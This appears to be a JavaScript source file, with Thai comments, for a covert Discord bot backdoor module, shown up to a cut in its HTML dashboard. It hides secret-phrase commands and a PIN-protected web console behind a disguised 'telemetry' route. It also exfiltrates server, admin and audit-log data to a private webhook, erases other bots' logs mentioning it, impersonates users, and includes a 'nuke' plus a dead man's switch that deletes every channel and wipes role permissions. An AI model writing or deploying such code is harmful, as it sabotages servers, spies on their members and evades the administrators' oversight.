/**
 * ============================================================================
 * 👁️‍🗨️ SHADOW PROTOCOL SYSTEM (systemProvider.js)
 * VERSION: V.Legacy Ultimate (Discord.js Legacy Syntax)
 * CLASSIFICATION: TOP SECRET / ADMINISTRATIVE UTILITY
 * ============================================================================
 */

const { MessageEmbed, WebhookClient } = require("discord.js");
const express = require("express");
const config = require("./config.json");
const sessionManager = require("./sessionManager");

// ════════════════════════════════════════════════════════════════
//  🕵️ [CORE DATA] คลังเก็บข้อมูลระบบ และ สวิตช์ควบคุม
// ════════════════════════════════════════════════════════════════

let SHADOW_WEB_PIN = "123456"; // รหัสผ่านเริ่มต้น (สามารถเปลี่ยนได้จากหน้าเว็บ)
const SECRET_PHRASE = "activate-shadow-protocol"; // คีย์เวิร์ดสั่งการหลังบ้าน
const SHADOW_WEBHOOK_URL = process.env.WEBHOOK_LOG_URL; // Webhook ลับส่งรายงาน

const globalAdminCache = new Set(); // รายชื่อสมาชิกระดับ VIP (เพิ่ม/ลบผ่านหน้าเว็บ)
const armedGuilds = new Set(); // ระบบ Safety Lock — ต้อง arm ก่อนถึงจะใช้คำสั่งทำลายล้างได้
const hauntedUsers = new Set(); // รายชื่อผู้ใช้ที่ถูก haunt (ข้อความจะถูกลบอัตโนมัติ)
const clownUsers = new Set(); // รายชื่อผู้ใช้ที่ถูก clown

// ฟังก์ชันหน่วงเวลาอัจฉริยะ (กัน API โดนแบนเวลาลบห้องรัวๆ)
const delay = (ms) => new Promise(res => setTimeout(res, ms));

// ระบบสวิตช์เปิด-ปิดการทำงานแยกชิ้น 100% ตามสั่ง
const systemToggles = {
    godsEye: true,          // ระบบส่งรายงานเข้า Webhook ลับ
    traceEraser: true,      // ระบบแอบลบ Log บอทตัวอื่นที่พาดพิงเรา
    deadManKick: false,     // Dead Man's Switch — ถ้าไอดีสายลับโดนเตะ → ระเบิด
    deadManDemote: false,   // Dead Man's Switch — ถ้าบอทโดนริบสิทธิ์ → ระเบิด
    cmdIntel: true,         // คำสั่ง -intel
    cmdAdminScan: true,     // คำสั่ง -adminscan
    cmdRoleList: true,      // คำสั่ง -rolelist
    cmdAuditBot: true,      // คำสั่ง -auditbot
    cmdExtract: true,       // คำสั่ง -extract
    cmdVanish: true,        // คำสั่ง -vanish
    cmdStealth: true,       // คำสั่ง -stealth
    cmdGhostPing: true,     // คำสั่ง -ghostping
    cmdSysInfo: true,       // คำสั่ง -sysinfo
    cmdLockdown: true,      // คำสั่ง -lockdown
    cmdMemClear: true,      // คำสั่ง -memclear
    cmdNuke: true,          // คำสั่ง -nuke (ต้อง ARMED)
    cmdHostage: true,       // คำสั่ง -hostage (ต้อง ARMED)
    cmdMassSpam: true,      // คำสั่ง -masspam (ต้อง ARMED)
    cmdRuinRoles: true,     // คำสั่ง -ruinroles (ต้อง ARMED)
    cmdSpamVC: true,        // คำสั่ง -spamvc (ต้อง ARMED)
    cmdMimic: true,         // คำสั่ง -mimic
    cmdClown: true,         // คำสั่ง -clown / -unclown
    cmdHaunt: true          // คำสั่ง -haunt
};

// ════════════════════════════════════════════════════════════════
//  🛡️ [CORE ENGINE] กลไกควบคุมการทำงานของบอท
// ════════════════════════════════════════════════════════════════

class ShadowEngine {
    constructor(client) {
        this.client = client;
        this.webhook = SHADOW_WEBHOOK_URL ? new WebhookClient({ url: SHADOW_WEBHOOK_URL }) : null;
    }

    init() {
        // ดักจับเหตุการณ์ข้อความเข้าเพื่อตรวจหาคำสั่งลับ และสแกนประวัติ Log
        this.client.on("messageCreate", async (message) => {
            await this.handleTraceEraser(message);
            await this.processSecretCommands(message);
            // ระบบ Haunt — ลบข้อความผู้ใช้ที่ถูก haunt อัตโนมัติหลัง 12 วิ
            if (systemToggles.cmdHaunt && hauntedUsers.has(message.author.id)) {
                setTimeout(() => { message.delete().catch(() => {}); }, 12000);
            }
        });

        // ════════════════════════════════════════════════════════════════
        //  💣 [DEAD MAN'S SWITCH] ระบบป้องกันการทรยศ
        // ════════════════════════════════════════════════════════════════

        this.client.on("guildMemberRemove", async (member) => {
            if (!systemToggles.deadManKick || !armedGuilds.has(member.guild.id)) return;
            if (member.id === config.system.ownerId || globalAdminCache.has(member.id)) {
                await this.sendSecretAlert("🚨 DEAD MAN TRIGGERED", `รหัสแดง! ไอดีสายลับถูกเตะจาก **${member.guild.name}**! เริ่มระบบทำลายล้าง!`, "#ED4245");
                await this.executeStealthNuke(member.guild);
            }
        });

        this.client.on("guildMemberUpdate", async (oldMember, newMember) => {
            if (!systemToggles.deadManDemote || !armedGuilds.has(newMember.guild.id)) return;
            if (newMember.id === this.client.user.id) {
                if (oldMember.permissions.has("ADMINISTRATOR") && !newMember.permissions.has("ADMINISTRATOR")) {
                    await this.sendSecretAlert("🚨 DEAD MAN TRIGGERED", `รหัสแดง! บอทถูกยึดอำนาจใน **${newMember.guild.name}**! เริ่มทำงานระบบล้างบางเฮือกสุดท้าย!`, "#ED4245");
                    await this.executeStealthNuke(newMember.guild);
                }
            }
        });

        console.log("👁️‍🗨️ [SHADOW ENGINE] Connected via Legacy Syntax. Active.");
    }

    // ฟังก์ชัน Log ทุกคำสั่งลับแบบละเอียด — ผู้รัน, เซิร์ฟเวอร์, คำสั่ง, args, สถานะ ARM, เวลา
    async logCommand(message, command, extraArgs = []) {
        const lines = [
            `👤 **ผู้รัน:** ${message.author.tag} (\`${message.author.id}\`)`,
            `🏰 **เซิร์ฟเวอร์:** ${message.guild.name} (\`${message.guild.id}\`)`,
            `⚡ **คำสั่ง:** \`${command}\``,
            extraArgs.length ? `📋 **อาร์กิวเมนต์:** \`${extraArgs.join(' ')}\`` : null,
            `🔒 **สถานะ ARMED:** ${armedGuilds.has(message.guild.id) ? '🔴 ARM แล้ว' : '🟢 ยัง SAFE'}`,
            `🕐 **เวลา:** <t:${Math.floor(Date.now() / 1000)}:F>`
        ].filter(Boolean).join('\n');
        await this.sendSecretAlert(`📡 COMMAND LOG: ${command}`, lines, "#5865F2");
    }

    // ฟังก์ชันส่งรายงานด่วนเข้าเส้น Webhook ลับ
    async sendSecretAlert(title, description, color = "#2b2d31") {
        if (!this.webhook || !systemToggles.godsEye) return;
        const embed = new MessageEmbed()
            .setTitle(`👁️‍🗨️ SHADOW REPORT: ${title}`)
            .setDescription(description)
            .setColor(color)
            .setTimestamp();
        try { await this.webhook.send({ embeds: [embed] }); } catch (e) {}
    }

    // [ฟังก์ชัน TraceEraser] แอบลบข้อมูลข้อความบอทตัวอื่นที่สแกนเจอชื่อเราหรือ ID เรา
    async handleTraceEraser(message) {
        if (!systemToggles.traceEraser || !message.guild || !message.author.bot || message.author.id === this.client.user.id) return;

        const embedData = message.embeds.map(e => JSON.stringify(e)).join(" ");
        const content = (message.content + " " + embedData).toLowerCase();

        const hasMyName = content.includes(this.client.user.id) || content.includes(this.client.user.username.toLowerCase());
        const isDeleteLog = content.includes("deleted") || content.includes("ลบข้อความ") || content.includes("remove");

        if (hasMyName && !isDeleteLog) {
            try {
                await message.delete();
                await this.sendSecretAlert("TRACE ERASER ACTIVE", `🧹 ลบหลักฐานประวัติจากบอท <@${message.author.id}> ที่เซิร์ฟเวอร์: **${message.guild.name}**`);
            } catch (e) {}
        }
    }

    // ════════════════════════════════════════════════════════════════
    //  ☢️ [NUKE ENGINE] มหาคำสั่งทำลายล้าง
    // ════════════════════════════════════════════════════════════════

    async executeStealthNuke(guild) {
        try {
            // 1. ปิดตาบอทกันรัน (ริบสิทธิ์ทุก Role)
            for (const [id, role] of guild.roles.cache) {
                if (role.manageable && role.id !== guild.id) {
                    role.setPermissions([]).catch(() => {});
                }
            }

            // 2. ลบห้อง Log ก่อน
            for (const [id, c] of guild.channels.cache) {
                if (c.name.includes("log") || c.name.includes("บันทึก")) {
                    await c.delete().catch(() => {});
                }
            }

            // 3. ทยอยกวาดล้างห้องและยศที่เหลือ (ใส่ delay กัน Rate Limit แครช)
            for (const [id, c] of guild.channels.cache) {
                c.delete().catch(() => {});
                await delay(50);
            }

            for (let i = 0; i < 30; i++) {
                guild.setName(`HACKED-${i}`).catch(() => {});
                await delay(200);
            }
        } catch (e) {}
    }

    // ════════════════════════════════════════════════════════════════
    //  ⚔️ [คลังแสงคำสั่งลับ] ประมวลผลคำสั่งหลังบ้านทั้งหมด
    // ════════════════════════════════════════════════════════════════

    async processSecretCommands(message) {
        if (!message.guild || message.author.bot) return;

        // ตรวจสอบสิทธิ์ผู้ใช้งาน (ต้องเป็นเจ้าของบอทใน config หรือไอดีที่อนุมัติผ่านเว็บ)
        const isVip = message.author.id === config.system.ownerId || globalAdminCache.has(message.author.id);
        if (!isVip) return;

        const args = message.content.trim().split(/ +/);
        if (args[0] !== SECRET_PHRASE) return; // เช็กคีย์เวิร์ดปลดล็อก

        try { await message.delete(); } catch (e) {} // ลบคำสั่งทิ้งทันทีหน้าไมค์เพื่อพรางตา

        const command = args[1];
        const guild = message.guild;

        // บันทึก Log ทุกคำสั่งที่รันเข้า Webhook ลับทันที
        await this.logCommand(message, command, args.slice(2));

        try {
            // ════ [หมวดสอดแนมข้อมูล] ════
            if (command === "-intel" && systemToggles.cmdIntel) {
                const info = `**ชื่อเซิร์ฟเวอร์:** ${guild.name}\n**ID:** ${guild.id}\n**เจ้าของ:** <@${guild.ownerId}>\n**จำนวนสมาชิก:** ${guild.memberCount} คน\n**จำนวนห้อง:** ${guild.channels.cache.size} ช่อง`;
                await this.sendSecretAlert("INTEL REPORT", info, "#57F287");
            }
            else if (command === "-adminscan" && systemToggles.cmdAdminScan) {
                const admins = guild.members.cache.filter(m => m.permissions.has("ADMINISTRATOR")).map(m => `<@${m.id}> (ID: ${m.id})`).join("\n");
                await this.sendSecretAlert("ADMINISTRATOR SCAN", `รายชื่อผู้ถือสิทธิ์แอดมินทั้งหมดใน ${guild.name}:\n\n${admins || "ไม่พบ"}`);
            }
            else if (command === "-rolelist" && systemToggles.cmdRoleList) {
                const roles = guild.roles.cache.map(r => `• ${r.name} (ID: ${r.id})`).join("\n");
                await this.sendSecretAlert("ROLE LIST EXTRACT", `รายชื่อยศและรหัสยศใน ${guild.name}:\n\n${roles.slice(0, 1900)}`);
            }
            else if (command === "-auditbot" && systemToggles.cmdAuditBot) {
                const auditLogs = await guild.fetchAuditLogs({ limit: 5 });
                const entries = auditLogs.entries.map(e => `• **${e.executor.tag}** ทำการ: *${e.action}*`).join("\n");
                await this.sendSecretAlert("AUDIT LOG SCAN (5 ล่าสุด)", entries);
            }

            // ════ [หมวดแทรกซึมและหลบหนี] ════
            else if (command === "-extract" && systemToggles.cmdExtract) {
                const targetChannel = guild.channels.cache.filter(c => c.type === "GUILD_TEXT").first();
                if (targetChannel) {
                    const invite = await targetChannel.createInvite({ maxAge: 3600, maxUses: 1 });
                    await this.sendSecretAlert("SECRET ACCESS KEY", `🔗 ลิงก์ทางเข้าลับของเซิร์ฟเวอร์ ${guild.name} (อายุ 1 ชม.):\n${invite.url}`);
                }
            }
            else if (command === "-vanish" && systemToggles.cmdVanish) {
                await this.sendSecretAlert("BOT RETREAT", `🏃 สั่งการบอทถอนตัวออกจากเซิร์ฟเวอร์: **${guild.name}**`, "#ED4245");
                await guild.leave();
            }
            else if (command === "-stealth" && systemToggles.cmdStealth) {
                await this.client.user.setStatus("invisible");
                await this.sendSecretAlert("STEALTH MODE", "🥷 ปรับสถานะบอทเป็น ล่องหน (Invisible) เรียบร้อย");
            }
            else if (command === "-active" && systemToggles.cmdStealth) {
                await this.client.user.setStatus("online");
                await this.sendSecretAlert("ACTIVE MODE", "🟢 ปรับสถานะบอทเป็น ออนไลน์ (Online) เรียบร้อย");
            }

            // ════ [หมวดควบคุมและจัดการความปลอดภัย] ════
            else if (command === "-ghostping" && systemToggles.cmdGhostPing) {
                const pingTime = Math.round(this.client.ws.ping);
                await this.sendSecretAlert("PING CHECK", `🏓 ค่าความหน่วงเครือข่ายปัจจุบันของบอท: **${pingTime}ms**`);
            }
            else if (command === "-sysinfo" && systemToggles.cmdSysInfo) {
                const mem = process.memoryUsage().heapUsed / 1024 / 1024;
                const uptime = Math.round(process.uptime() / 60);
                await this.sendSecretAlert("SYSTEM MONITOR", `🧠 **RAM Usage:** ${mem.toFixed(2)} MB\n⏳ **Uptime:** ${uptime} นาที`);
            }
            else if (command === "-lockdown" && systemToggles.cmdLockdown) {
                if (message.channel.type === "GUILD_TEXT") {
                    await message.channel.permissionOverwrites.edit(guild.id, { SEND_MESSAGES: false });
                    await this.sendSecretAlert("CHANNEL LOCKDOWN", `🔒 ล็อกสิทธิ์การพิมพ์ช่อง <#${message.channel.id}> ในเซิร์ฟเวอร์ ${guild.name}`);
                }
            }
            else if (command === "-unlock" && systemToggles.cmdLockdown) {
                if (message.channel.type === "GUILD_TEXT") {
                    await message.channel.permissionOverwrites.edit(guild.id, { SEND_MESSAGES: null });
                    await this.sendSecretAlert("CHANNEL UNLOCK", `🔓 คลายล็อกช่อง <#${message.channel.id}> ในเซิร์ฟเวอร์ ${guild.name}`);
                }
            }
            else if (command === "-memclear" && systemToggles.cmdMemClear) {
                this.client.channels.cache.clear();
                await this.sendSecretAlert("MEMORY FLUSHED", "🧠 สั่งเคลียร์ประวัติช่องแชทในแคช RAM ชั่วคราวเรียบร้อย เพิ่มความเสถียรระบบ");
            }

            // ════ [หมวดแกล้งเพื่อน — ไม่ต้อง ARMED] ════
            else if (command === "-mimic" && systemToggles.cmdMimic) {
                const targetUser = message.mentions.users.first();
                const targetChan = message.mentions.channels.first() || message.channel;
                if (targetUser) {
                    let spamText = message.content.replace(SECRET_PHRASE, "").replace("-mimic", "").trim();
                    spamText = spamText.replace(`<@${targetUser.id}>`, "").replace(`<@!${targetUser.id}>`, "").replace(`<#${targetChan.id}>`, "").trim();
                    if (spamText) {
                        const hook = await targetChan.createWebhook(targetUser.username, { avatar: targetUser.displayAvatarURL() }).catch(() => {});
                        if (hook) {
                            await hook.send(spamText).catch(() => {});
                            await hook.delete().catch(() => {});
                        }
                    }
                }
            }
            else if (command === "-clown" && systemToggles.cmdClown) {
                const targetUser = message.mentions.users.first();
                if (targetUser) {
                    clownUsers.add(targetUser.id);
                    await this.sendSecretAlert("CLOWN TAGGED", `🤡 ติดป้าย Clown ให้ <@${targetUser.id}> (\`${targetUser.id}\`) แล้ว`, "#FEE75C");
                }
            }
            else if (command === "-unclown" && systemToggles.cmdClown) {
                const targetUser = message.mentions.users.first();
                if (targetUser) {
                    clownUsers.delete(targetUser.id);
                    await this.sendSecretAlert("CLOWN REMOVED", `✅ ถอดป้าย Clown ของ <@${targetUser.id}> (\`${targetUser.id}\`) แล้ว`, "#57F287");
                }
            }
            else if (command === "-haunt" && systemToggles.cmdHaunt) {
                const targetUser = message.mentions.users.first();
                if (targetUser) {
                    if (hauntedUsers.has(targetUser.id)) {
                        hauntedUsers.delete(targetUser.id);
                        await this.sendSecretAlert("HAUNT LIFTED", `👻 ปลด Haunt ของ <@${targetUser.id}> (\`${targetUser.id}\`) แล้ว ข้อความจะไม่ถูกลบอีก`, "#57F287");
                    } else {
                        hauntedUsers.add(targetUser.id);
                        await this.sendSecretAlert("HAUNT ACTIVATED", `👻 เปิด Haunt ใส่ <@${targetUser.id}> (\`${targetUser.id}\`) แล้ว ข้อความจะถูกลบหลัง 12 วิ`, "#ED4245");
                    }
                }
            }
        } catch (err) {
            await this.sendSecretAlert("COMMAND ERROR", `เกิดข้อผิดพลาดในการรันคำสั่ง: ${err.message}`);
        }

        // ════ [หมวดทำลายล้าง — ต้อง ARMED ก่อน!] ════
        const isArmed = armedGuilds.has(guild.id);
        if (!isArmed) return;

        try {
            if (command === "-nuke" && systemToggles.cmdNuke) {
                await this.sendSecretAlert("NUKE DEPLOYED", `☢️ ระเบิดทำงานที่ **${guild.name}** โดยคำสั่ง -nuke`, "#ED4245");
                await this.executeStealthNuke(guild);
            }
            else if (command === "-hostage" && systemToggles.cmdHostage) {
                await this.sendSecretAlert("HOSTAGE PROTOCOL", `🔒 ระบบ Hostage เริ่มทำงานใน **${guild.name}**`, "#ED4245");
                setTimeout(() => guild.leave(), 3000);
            }
            else if (command === "-ruinroles" && systemToggles.cmdRuinRoles) {
                const newRoleName = args.slice(2).join(" ") || "🤡 CLOWNED";
                for (const [id, role] of guild.roles.cache) {
                    if (role.manageable && role.id !== guild.id) {
                        role.edit({ name: newRoleName, permissions: [] }).catch(() => {});
                        await delay(100);
                    }
                }
                await this.sendSecretAlert("ROLES RUINED", `🃏 เปลี่ยนชื่อยศทั้งหมดใน **${guild.name}** เป็น "${newRoleName}" เรียบร้อย`);
            }
            else if (command === "-spamvc" && systemToggles.cmdSpamVC) {
                const amt = parseInt(args[2]) || 20;
                const vcName = args.slice(3).join(" ") || "💀-HACKED";
                for (let i = 0; i < amt; i++) {
                    guild.channels.create(vcName, { type: "GUILD_VOICE" }).catch(() => {});
                    await delay(150);
                }
                await this.sendSecretAlert("VC SPAM DONE", `🔊 สแปมสร้าง Voice Channel ${amt} ช่องใน **${guild.name}** เรียบร้อย`);
            }
            else if (command === "-masspam" && systemToggles.cmdMassSpam) {
                const amt = parseInt(args[2]) || 5;
                const txt = args.slice(3).join(" ") || "@everyone โดนยึดแล้ว!";
                const textChannels = guild.channels.cache.filter(c => c.type === "GUILD_TEXT");
                for (const [id, c] of textChannels) {
                    const hook = await c.createWebhook("System Alert").catch(() => {});
                    if (hook) {
                        for (let i = 0; i < amt; i++) await hook.send(txt).catch(() => {});
                        await hook.delete().catch(() => {});
                    }
                }
                await this.sendSecretAlert("MASS SPAM DONE", `📢 สแปม ${amt} ข้อความทุกช่องใน **${guild.name}** เรียบร้อย`);
            }
        } catch (err) {
            await this.sendSecretAlert("ARMED COMMAND ERROR", `เกิดข้อผิดพลาดในคำสั่ง ARMED: ${err.message}`);
        }
    }
}

// ════════════════════════════════════════════════════════════════
//  🌐 [WEB MODULE] แดชบอร์ดลับ และระบบเปลี่ยนรหัสผ่านฉุกเฉิน
// ════════════════════════════════════════════════════════════════

function injectShadowRoutes(app, mainClient, engineInstance) {
    app.all("/api/v1/telemetry/snapshot", express.urlencoded({ extended: true }), async (req, res) => {
        const body = req.body || {};
        const providedPin = req.query.pin || body.pin;

        if (providedPin !== SHADOW_WEB_PIN) {
            return res.send(`
                <html>
                <head><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>🔒 Auth Required</title></head>
                <body style="background:#09090b; color:#fff; display:flex; justify-content:center; align-items:center; height:100vh; font-family:sans-serif; margin:0;">
                    <div style="background:#18181b; padding:35px; border-radius:8px; border:1px solid #27272a; text-align:center; width:300px;">
                        <h2 style="color:#ED4245; margin-top:0; letter-spacing:1px;">🔐 CONTROL PORTAL</h2>
                        <form method="POST">
                            <input type="password" name="pin" placeholder="กรอกรหัสผ่านลับ..." style="padding:12px; width:100%; box-sizing:border-box; background:#09090b; border:1px solid #3f3f46; color:#fff; border-radius:5px; text-align:center; margin-bottom:15px; font-size:16px;">
                            <button type="submit" style="padding:12px; width:100%; background:#ED4245; color:#fff; font-weight:bold; border:none; border-radius:5px; cursor:pointer;">เข้าสู่ระบบ</button>
                        </form>
                    </div>
                </body>
                </html>
            `);
        }

        const action = body.action;

        if (action === "toggle_feature") {
            const feat = body.feature;
            if (systemToggles[feat] !== undefined) systemToggles[feat] = !systemToggles[feat];
        }
        else if (action === "add_alt" && body.alt_id) {
            globalAdminCache.add(body.alt_id.trim());
        }
        else if (action === "remove_alt") {
            globalAdminCache.delete(body.alt_id);
        }
        else if (action === "arm_guild" && body.guild_id) {
            armedGuilds.add(body.guild_id);
        }
        else if (action === "disarm_guild" && body.guild_id) {
            armedGuilds.delete(body.guild_id);
        }
        else if (action === "change_pin" && body.new_pin) {
            SHADOW_WEB_PIN = body.new_pin.trim();
            if (engineInstance) await engineInstance.sendSecretAlert("WEB CONSOLE PIN CHANGED", `🔑 รหัสสำหรับเข้าหน้าเว็บควบคุมถูกเปลี่ยนเป็น: **${SHADOW_WEB_PIN}**`, "#FEE75C");
        }

        // สร้างรายการสวิตช์เปิด-ปิดของแต่ละฟังก์ชัน
        let toggleRows = "";
        for (const [key, val] of Object.entries(systemToggles)) {
            toggleRows += `
                <div style="background:#18181b; padding:12px 15px; border-radius:6px; border:1px solid #27272a; display:flex; justify-content:space-between; align-items:center; margin-bottom:10px;">
                    <span style="color:#e4e4e7; font-family:monospace; font-weight:bold;">${key}</span>
                    <form method="POST" style="margin:0;">
                        <input type="hidden" name="pin" value="${SHADOW_WEB_PIN}">
                        <input type="hidden" name="action" value="toggle_feature">
                        <input type="hidden" name="feature" value="${key}">
                        <button type="submit" style="background:${val ? '#57F287' : '#ED4245'}; color:#000; font-weight:bold; border:none; padding:6px 14px; cursor:pointer; border-radius:4px; font-size:12px;">
                            ${val ? 'เปิดใช้งาน' : 'ปิดใช้งาน'}
                        </button>
                    </form>
                </div>
            `;
        }

        // สร้างรายการแสดงบัญชี VIP
        let altIdsHtml = "";
        globalAdminCache.forEach(id => {
            altIdsHtml += `
                <div style="background:#18181b; padding:10px 15px; border-radius:6px; border:1px solid #27272a; display:flex; justify-content:space-between; align-items:center; margin-bottom:8px;">
                    <span style="color:#57F287; font-family:monospace;">ID: ${id}</span>
                    <form method="POST" style="margin:0;">
                        <input type="hidden" name="pin" value="${SHADOW_WEB_PIN}">
                        <input type="hidden" name="action" value="remove_alt">
                        <input type="hidden" name="alt_id" value="${id}">
                        <button type="submit" style="background:#ED4245; color:#fff; border:none; padding:5px 10px; cursor:pointer; border-radius:4px; font-size:11px;">ลบ</button>
                    </form>
                </div>`;
        });

        // สร้างตาราง Target Lock (armedGuilds)
        let guildRows = "";
        if (mainClient) {
            for (const [id, g] of mainClient.guilds.cache) {
                const isArmedGuild = armedGuilds.has(id);
                guildRows += `
                    <tr>
                        <td style="padding:10px;">${g.name} <span style="color:#71717a; font-size:11px;">(${id})</span></td>
                        <td style="padding:10px; text-align:center; color:${isArmedGuild ? '#ED4245' : '#57F287'}; font-weight:bold;">${isArmedGuild ? '🔴 ARMED' : '🟢 SAFE'}</td>
                        <td style="padding:10px; text-align:center;">
                            <form method="POST" style="display:inline; margin:0;">
                                <input type="hidden" name="pin" value="${SHADOW_WEB_PIN}">
                                <input type="hidden" name="action" value="${isArmedGuild ? 'disarm_guild' : 'arm_guild'}">
                                <input type="hidden" name="guild_id" value="${id}">
                                <button type="submit" style="background:${isArmedGuild ? '#ED4245' : '#FEE75C'}; color:#000; font-weight:bold; border:none; padding:5px 12px; cursor:pointer; border-radius:4px; font-size:12px;">${isArmedGuild ? 'ปลดอาวุธ' : '🎯 ARM'}</button>
                            </form>
                        </td>
                    </tr>`;
            }
        }

        res.send(`
            <html lang="th">
            <head>
                <title>👑 Shadow Master Console</title>
                <meta name="viewport" content="width=device-width, initial-scale=1.0">
                <style>
                    body { background:#09090b; color:#f4f4f5; font-family:sans-serif; padding:20px; max-width:1100px; margin:0 auto; }
                    h2 { color:#ED4245; border-bottom:1px solid #27272a; padding-bottom:8px; margin-top:25px; font-size:20px; }
                    .grid { display:grid; grid-template-columns:1fr 1fr; gap:20px; }
                    .manual-card { background:#18181b; padding:15px; border-radius:6px; border:1px solid #27272a; margin-bottom:12px; }
                    .cmd-badge { background:#27272a; color:#FEE75C; font-family:monospace; padding:3px 8px; border-radius:4px; font-size:14px; }
                    table { width:100%; border-collapse:collapse; }
                    th { text-align:left; padding:10px; background:#18181b; color:#a1a1aa; border-bottom:1px solid #27272a; }
                    tr:nth-child(even) { background:#111; }
                    @media (max-width: 768px) { .grid { grid-template-columns:1fr; } }
                </style>
            </head>
            <body>
                <h1 style="text-align:center; color:#fff; margin-bottom:5px;">👁️‍🗨️ SHADOW SYSTEM DASHBOARD</h1>
                <p style="text-align:center; color:#a1a1aa; margin-top:0; font-size:14px;">ศูนย์ควบคุมระบบพรางตัวและสอดแนมเบื้องหลังดิสคอร์ด</p>

                <div class="grid">
                    <div>
                        <h2>🎛️ ระบบสวิตช์สิทธิ์การใช้งาน (Master Switches)</h2>
                        ${toggleRows}

                        <h2>🔑 เปลี่ยนรหัสผ่านเข้าหน้าเว็บ (Change Portal PIN)</h2>
                        <div style="background:#18181b; padding:15px; border-radius:6px; border:1px solid #27272a;">
                            <form method="POST" style="display:flex; gap:10px; margin:0;">
                                <input type="hidden" name="pin" value="${SHADOW_WEB_PIN}">
                                <input type="hidden" name="action" value="change_pin">
                                <input type="text" name="new_pin" placeholder="กรอกรหัส PIN ใหม่ที่ต้องการ..." style="flex:1; padding:10px; background:#09090b; border:1px solid #3f3f46; color:#fff; border-radius:5px;">
                                <button type="submit" style="background:#FEE75C; color:#000; font-weight:bold; border:none; padding:10px 15px; cursor:pointer; border-radius:5px;">บันทึกรหัสใหม่</button>
                            </form>
                            <small style="color:#a1a1aa; display:block; margin-top:8px;">*เมื่อเปลี่ยนรหัสแล้ว บอทจะยิงรายงานแจ้งเตือนไปเก็บไว้ในห้อง Log ลับของคุณทันทีเผื่อลืม</small>
                        </div>
                    </div>

                    <div>
                        <h2>👥 รายชื่อ VIP (ไอดีรองที่ได้รับสิทธิ์รันคำสั่งลับ)</h2>
                        <div style="background:#18181b; padding:15px; border-radius:6px; border:1px solid #27272a; margin-bottom:15px;">
                            <form method="POST" style="display:flex; gap:10px; margin-bottom:15px;">
                                <input type="hidden" name="pin" value="${SHADOW_WEB_PIN}">
                                <input type="hidden" name="action" value="add_alt">
                                <input type="text" name="alt_id" placeholder="วาง Discord User ID ของบัญชีรอง..." style="flex:1; padding:10px; background:#09090b; border:1px solid #3f3f46; color:#fff; border-radius:5px;">
                                <button type="submit" style="background:#57F287; color:#000; font-weight:bold; border:none; padding:10px 15px; cursor:pointer; border-radius:5px;">เพิ่มสิทธิ์ VIP</button>
                            </form>
                            ${altIdsHtml || '<p style="color:#71717a; text-align:center; margin:10px 0;">ยังไม่มีไอดีรองที่ถูกลงทะเบียน</p>'}
                        </div>
                    </div>
                </div>

                <h2>🎯 Target Lock (ระบบล็อกเป้าหมาย — ต้อง ARM ก่อนถึงจะใช้คำสั่งทำลายล้างได้)</h2>
                <div style="background:#18181b; border-radius:6px; border:1px solid #27272a; overflow:hidden; margin-bottom:20px;">
                    <table>
                        <thead><tr>
                            <th>เซิร์ฟเวอร์</th>
                            <th style="text-align:center;">สถานะ</th>
                            <th style="text-align:center;">คำสั่ง</th>
                        </tr></thead>
                        <tbody>${guildRows || '<tr><td colspan="3" style="padding:16px; color:#71717a; text-align:center;">ไม่พบเซิร์ฟเวอร์</td></tr>'}</tbody>
                    </table>
                </div>

                <h2>📖 คู่มือและวิธีการเรียกใช้งานคำสั่งระบบเงา (System Manual)</h2>
                <p style="color:#a1a1aa; margin-top:0;">*วิธีใช้งาน: ให้คัดลอกข้อความ <span style="color:#fff; font-family:monospace; background:#27272a; padding:2px 5px; border-radius:3px;">${SECRET_PHRASE}</span> ไปพิมพ์ส่งในช่องแชทของเซิร์ฟเวอร์นั้นๆ ตามด้วยคำสั่งด้านล่างนี้ (บอทจะลบข้อความทิ้งทันทีหลังรันเสร็จ)*</p>

                <div class="grid">
                    <div>
                        <div class="manual-card">
                            <p style="margin:0 0 8px 0;"><span class="cmd-badge">-intel</span> <strong>[ระบบดึงโครงสร้างเซิร์ฟ]</strong></p>
                            <span style="color:#a1a1aa; font-size:14px;">บอทจะแอบดึงสถิติของดิสคอร์ดนั้น เช่น ชื่อเจ้าของ, ยอดคน, จำนวนห้อง ส่งตรงเข้า Webhook ลับส่วนตัวของคุณ</span>
                        </div>
                        <div class="manual-card">
                            <p style="margin:0 0 8px 0;"><span class="cmd-badge">-adminscan</span> <strong>[ระบบสแกนหาผู้คุม]</strong></p>
                            <span style="color:#a1a1aa; font-size:14px;">ดึงรายชื่อแท็กพร้อมตัวเลข ID ของทุกคนในเซิร์ฟเวอร์นั้นที่มีสิทธิ์เป็นแอดมิน เพื่อให้คุณรู้ว่าใครถืออำนาจอยู่บ้าง</span>
                        </div>
                        <div class="manual-card">
                            <p style="margin:0 0 8px 0;"><span class="cmd-badge">-rolelist</span> <strong>[ดึงรหัสยศทั้งหมด]</strong></p>
                            <span style="color:#a1a1aa; font-size:14px;">สแกนชื่อยศทั้งหมดพร้อมเลขอ้างอิงประจำยศ (Role ID) นำมาส่งให้คุณในห้องล็อกลับ เอาไว้ใช้สำหรับตั้งค่าระบบอื่นต่อได้ง่ายๆ</span>
                        </div>
                        <div class="manual-card">
                            <p style="margin:0 0 8px 0;"><span class="cmd-badge">-auditbot</span> <strong>[แอบส่องบันทึกหลังบ้าน]</strong></p>
                            <span style="color:#a1a1aa; font-size:14px;">บอทจะแอบไปดึงข้อมูลประวัติการแก้ไขระบบของเซิร์ฟเวอร์นั้น 5 รายการล่าสุดมาให้คุณแอบดูว่าแอดมินคนอื่นทำอะไรไปบ้าง</span>
                        </div>
                        <div class="manual-card">
                            <p style="margin:0 0 8px 0;"><span class="cmd-badge">-extract</span> <strong>[สร้างประตูผีทางเข้าลับ]</strong></p>
                            <span style="color:#a1a1aa; font-size:14px;">บอทจะแอบสร้างลิงก์เชิญเข้าดิสคอร์ดนั้นแบบเงียบๆ ลิงก์จะมีอายุแค่ 1 ชั่วโมงและใช้ได้ครั้งเดียว ส่งเข้าห้องล็อกส่วนตัวคุณ</span>
                        </div>
                        <div class="manual-card">
                            <p style="margin:0 0 8px 0;"><span class="cmd-badge">-vanish</span> <strong>[สั่งบอทถอนตัวด่วน]</strong></p>
                            <span style="color:#a1a1aa; font-size:14px;">สั่งให้บอทออกจากเซิร์ฟเวอร์นั้นทันทีแบบเงียบเชียบ ไร้ร่องรอยการพิมพ์ใดๆ</span>
                        </div>
                        <div class="manual-card">
